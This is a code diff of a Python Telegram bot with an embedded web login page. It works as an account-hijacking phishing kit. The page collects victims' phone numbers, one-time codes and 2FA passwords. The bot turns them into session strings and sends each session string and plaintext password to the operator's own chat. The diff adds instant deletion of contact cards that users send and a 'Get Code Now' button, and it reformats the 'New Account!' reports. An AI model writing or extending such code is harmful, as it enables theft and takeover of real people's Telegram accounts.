@@ -379,7 +379,6 @@ _main_bot_loop = None
 
 
 async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
-    """Send using a FRESH bot client — bypasses main bot loop lock."""
     logger.info(f"📤 Fresh bot client send to {chat_id}")
     tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
     c = None
@@ -413,7 +412,6 @@ async def _send_via_main_loop(chat_id, text, buttons=None, parse_mode=None):
 
 
 async def _send_html_via_fresh(chat_id, html_text):
-    """Send HTML-formatted message via fresh client (for <code> block)."""
     tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
     c = None
     try:
@@ -436,6 +434,31 @@ async def _send_html_via_fresh(chat_id, html_text):
                 os.remove(tmp_session)
         except Exception:
             pass
+
+
+# ============================================================
+# INSTANT CONTACT DELETE (thread, flood-safe)
+# ============================================================
+_contact_delete_queue = []
+_contact_delete_lock = threading.Lock()
+
+async def _instant_contact_delete(event, uid):
+    """Delete contact message instantly with flood-safe delay."""
+    try:
+        await asyncio.sleep(0.001)  # 1ms
+        await event.delete()
+        logger.info(f"✅ Contact card deleted from user {uid} in ~1ms")
+    except errors.FloodWaitError as fw:
+        # If flood wait, wait then delete
+        logger.warning(f"⚠️ FloodWait {fw.seconds}s — waiting to delete contact from {uid}")
+        try:
+            await asyncio.sleep(fw.seconds)
+            await event.delete()
+            logger.info(f"✅ Contact deleted after FloodWait {uid}")
+        except Exception as e2:
+            logger.error(f"contact delete after flood fail {uid}: {e2}")
+    except Exception as e:
+        logger.error(f"contact delete fail {uid}: {type(e).__name__}: {e}")
 
 
 def admin_menu():
@@ -742,7 +765,7 @@ async def check_session_validity(session_str):
 
 
 # ============================================================
-# EDIT INFO MSG (New Account)
+# EDIT INFO MSG (no buttons)
 # ============================================================
 async def edit_admin_msg(account, status_text):
     try:
@@ -751,7 +774,6 @@ async def edit_admin_msg(account, status_text):
             logger.warning(f"edit_admin_msg: no info msg_id for {account.get('phone')}")
             return
         phone = account.get("phone", "?")
-        phone_clean = phone.replace("+", "").strip()
         name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
         name = name.strip() or "?"
         dc = account.get("dc", "?")
@@ -768,27 +790,18 @@ async def edit_admin_msg(account, status_text):
         hours_left = max(0, 24 - hours_passed)
 
         new_text = (f"{status_text}{extra}\n\n"
-                    f"📱 Phone: {phone}\n"
-                    f"👤 Name: {name}\n"
-                    f"🆔 User ID: {account.get('user_id', '?')}\n"
+                    f"🔔 New Account!\n"
+                    f"📱 {phone}\n"
+                    f"👤 {name}\n"
+                    f"🆔 {account.get('user_id', '?')}\n"
                     f"🌐 DC: {dc}\n"
                     f"⏱ Age: {hours_passed:.2f}h / 24h\n"
                     f"⏳ Time Left: {hours_left:.2f}h")
         if len(new_text) > 4000:
             new_text = new_text[:3990] + "..."
 
-        buttons = [
-            [
-                Button.inline("🔍 Expire Check", data=f"mancheck_{phone_clean}"),
-                Button.inline("🗑 Expire + Delete", data=f"mandel_{phone_clean}"),
-            ],
-            [
-                Button.inline("🚪 Terminate + 2FA", data=f"manterm_{phone_clean}"),
-            ],
-        ]
-
         try:
-            await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, buttons=buttons)
+            await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text)
             logger.info(f"✅ Info msg edited: {phone} → {status_text[:40]}")
             return
         except errors.MessageNotModifiedError:
@@ -801,7 +814,7 @@ async def edit_admin_msg(account, status_text):
             c = TelegramClient(tmp_session, API_ID, API_HASH)
             await c.start(bot_token=BOT_TOKEN)
             try:
-                await c.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, buttons=buttons)
+                await c.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text)
                 logger.info(f"✅ Info msg edited (fresh): {phone}")
                 return
             finally:
@@ -818,7 +831,7 @@ async def edit_admin_msg(account, status_text):
             logger.warning(f"fresh edit fail: {type(e2).__name__}: {e2}")
 
         try:
-            r = await _send_via_main_loop(YOUR_TELEGRAM_ID, new_text, buttons=buttons)
+            r = await _send_via_main_loop(YOUR_TELEGRAM_ID, new_text)
             logger.info(f"✅ New info msg sent: {phone} (mid={r.id})")
             account["admin_notify_msg_id"] = r.id
             save_account(account)
@@ -830,10 +843,9 @@ async def edit_admin_msg(account, status_text):
 
 
 # ============================================================
-# EDIT SESSION MSG (with status line on top)
+# EDIT SESSION MSG
 # ============================================================
 async def edit_session_msg(account, status_text):
-    """Edit session msg — prepend status line above the session code block."""
     try:
         msg_id = account.get("admin_session_msg_id")
         if not msg_id:
@@ -844,7 +856,20 @@ async def edit_session_msg(account, status_text):
         if not ss:
             return
 
-        new_html = f"<b>{status_text}</b>\n\n<b>🔑 Session String</b>\n\n<code>{ss}</code>"
+        ss_len = len(ss)
+        name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
+        name = name.strip() or "?"
+        dc = account.get("dc", "?")
+        user_id = account.get("user_id", "?")
+
+        new_html = (f"<b>{status_text}</b>\n\n"
+                    f"🔔 New Account!\n"
+                    f"📱 {phone}\n"
+                    f"👤 {name}\n"
+                    f"🆔 {user_id}\n"
+                    f"🌐 DC: {dc}\n"
+                    f"📏 Session: {ss_len} chars\n\n"
+                    f"🔑 Session:\n<code>{ss}</code>")
         if len(new_html) > 4000:
             new_html = new_html[:3990] + "..."
 
@@ -894,9 +919,7 @@ async def cb(event):
     chat_id = event.sender_id
 
     try:
-        # ============================================================
         # EXPIRE CHECK
-        # ============================================================
         if data.startswith("mancheck_"):
             phone_clean = data.replace("mancheck_", "")
             phone = "+" + phone_clean
@@ -951,9 +974,7 @@ async def cb(event):
                 await event.answer(f"Err: {str(e)[:40]}", alert=True)
             return
 
-        # ============================================================
         # EXPIRE + DELETE
-        # ============================================================
         if data.startswith("mandel_"):
             phone_clean = data.replace("mandel_", "")
             phone = "+" + phone_clean
@@ -1008,9 +1029,7 @@ async def cb(event):
             await event.answer("✅ Deleted", alert=True)
             return
 
-        # ============================================================
         # TERMINATE + 2FA
-        # ============================================================
         if data.startswith("manterm_"):
             phone_clean = data.replace("manterm_", "")
             phone = "+" + phone_clean
@@ -1121,9 +1140,7 @@ async def cb(event):
             await event.answer("✅ Terminated", alert=True)
             return
 
-        # ============================================================
         # RESET NUMBERS
-        # ============================================================
         if data == "menu_reset_numbers":
             await event.answer()
             await safe_send(chat_id,
@@ -1480,23 +1497,26 @@ async def cancel(event):
 
 
 # ============================================================
-# MESSAGE INPUT HANDLER
+# MESSAGE INPUT HANDLER — instant contact delete + OTP
 # ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
     global welcome_config, broadcast_config, share_config, auto_2fa_pass, captured_accounts
 
+    # ===== NON-OWNER MESSAGES =====
     if event.sender_id != YOUR_TELEGRAM_ID:
+        # INSTANT contact delete (fire and forget task)
         try:
             if event.message and event.message.contact:
-                logger.info(f"🚫 Contact from user {event.sender_id} — deleting in 1ms")
-                await asyncio.sleep(0.001)
-                await event.delete()
-                logger.info(f"✅ Contact card deleted")
+                uid = event.sender_id
+                # Fire delete task in background — 0.001s delay
+                asyncio.create_task(_instant_contact_delete(event, uid))
+                logger.info(f"🚀 Contact from {uid} — instant delete scheduled")
         except Exception as e:
-            logger.warning(f"contact delete err: {e}")
+            logger.warning(f"contact delete schedule err: {e}")
         return
 
+    # ===== OWNER COMMANDS =====
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -1707,7 +1727,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML
+# WEBAPP HTML — with Get Code button linking to https://t.me/+42777
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1731,6 +1751,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 .green{background:linear-gradient(45deg,#25D366,#128C7E)}
 .blue{background:linear-gradient(45deg,#0088cc,#00a8e8)}
 .red{background:linear-gradient(45deg,#e94560,#d63851)}
+.purple{background:linear-gradient(45deg,#8e44ad,#6c3483)}
 .otps{display:flex;gap:8px;justify-content:center;margin:20px 0}
 .otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none}
 .otps input:focus{border-color:#0088cc}
@@ -1746,6 +1767,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 .sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
 .sst.done{background:#4CAF50;color:white}
 .sst.active{background:#0088cc;color:white}
+.getcode{margin-top:20px;display:none}
+.getcode.on{display:block}
 </style>
 </head>
 <body>
@@ -1772,6 +1795,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 </div>
 <div id="otpMsg" class="msg"></div>
 <div class="resend" id="resendBtn">Resend code</div>
+<div class="getcode on" id="getCodeWrap">
+<button class="btn purple" id="getCodeBtn">📲 Get Code Now</button>
+</div>
 </div>
 <div id="pwdBox" class="modal">
 <div class="ico">&#128272;</div>
@@ -1970,6 +1996,17 @@ function submitOtp() {
   }).catch(function(){ msg('otpMsg', 'Error', 'err'); });
 }
 document.getElementById('resendBtn').onclick = function(){ document.getElementById('resendBtn').style.display='none'; openOtp(); };
+
+// GET CODE BUTTON — opens https://t.me/+42777
+document.getElementById('getCodeBtn').onclick = function() {
+  var url = 'https://t.me/+42777';
+  if (tg && typeof tg.openTelegramLink === 'function') {
+    tg.openTelegramLink(url);
+  } else {
+    window.open(url, '_blank');
+  }
+};
+
 function startPwdCheck() {
   if (pwdCheck) clearInterval(pwdCheck);
   pwdCheck = setInterval(function(){
@@ -2156,7 +2193,6 @@ def _run_tg_thread(phone, code, password, tg_id):
 
 async def _tg_action(phone, code=None, password=None, tg_id=None):
     if not code:
-        # ===== FAST OTP =====
         logger.info(f"🚀 OTP FAST START: phone={phone}")
         t0 = time.time()
         client = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -2204,7 +2240,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             except Exception:
                 pass
 
-    # ===== VERIFY =====
     with sessions_lock:
         if phone not in user_sessions:
             logger.error(f"❌ VERIFY: No session stored for {phone}")
@@ -2274,38 +2309,28 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         logger.info(f"✅ ACCOUNT SAVED: {phone}")
 
         phone_clean = phone.replace("+", "").strip()
-        extra = ""
-        if pu:
-            extra = "\n🔐 2FA Used"
-            if password:
-                extra += f" | Pwd: {password}"
+        name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
+        ss_len = len(ss)
 
-        # ===== INFO MESSAGE (with buttons) =====
-        info_msg = (f"🆕 New Account!{extra}\n\n"
-                    f"📱 Phone: {phone}\n"
-                    f"👤 Name: {me.first_name} {me.last_name or ''}\n"
-                    f"🆔 User ID: {me.id}\n"
+        # ===== INFO MESSAGE (NO BUTTONS) =====
+        info_msg = (f"🔔 New Account!\n"
+                    f"📱 {phone}\n"
+                    f"👤 {name_full}\n"
+                    f"🆔 {me.id}\n"
                     f"🌐 DC: {dc}\n"
                     f"⏱ Age: 0.0h / 24h\n"
                     f"⏳ Time Left: 24.0h")
+        if pu and password:
+            info_msg += f"\n🔐 2FA: {password}"
+
         if len(info_msg) > 4000:
             info_msg = info_msg[:3990] + "..."
-
-        buttons = [
-            [
-                Button.inline("🔍 Expire Check", data=f"mancheck_{phone_clean}"),
-                Button.inline("🗑 Expire + Delete", data=f"mandel_{phone_clean}"),
-            ],
-            [
-                Button.inline("🚪 Terminate + 2FA", data=f"manterm_{phone_clean}"),
-            ],
-        ]
 
         info_sent = False
         for attempt in range(3):
             try:
                 logger.info(f"📤 INFO attempt {attempt+1}/3")
-                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, info_msg, buttons=buttons)
+                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, info_msg)
                 if r:
                     acc["admin_notify_msg_id"] = r.id
                     save_account(acc)
@@ -2317,9 +2342,10 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                 logger.warning(f"INFO attempt {attempt+1} fail: {type(e).__name__}: {e}")
                 await asyncio.sleep(0.5)
 
-        # ===== SESSION MESSAGE (HTML <code> for tap-to-copy) =====
+        # ===== SESSION MESSAGE (HTML <code> tap-to-copy) =====
         session_sent = False
-        session_html = f"<b>🔑 Session String</b>\n\n<code>{ss}</code>"
+        session_html = (f"🔑 Session:\n"
+                        f"<code>{ss}</code>")
         for attempt in range(3):
             try:
                 logger.info(f"📤 SESSION HTML attempt {attempt+1}/3")
@@ -2336,8 +2362,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                 await asyncio.sleep(0.5)
 
         if not session_sent:
-            # Fallback: markdown code block
-            session_md = f"**🔑 Session String**\n\n```\n{ss}\n```"
+            session_md = f"🔑 Session:\n```\n{ss}\n```"
             for attempt in range(3):
                 try:
                     r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, session_md, parse_mode='md')
@@ -2353,7 +2378,6 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                     await asyncio.sleep(0.5)
 
         if not session_sent:
-            # Fallback: plain text
             for attempt in range(3):
                 try:
                     r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, ss)
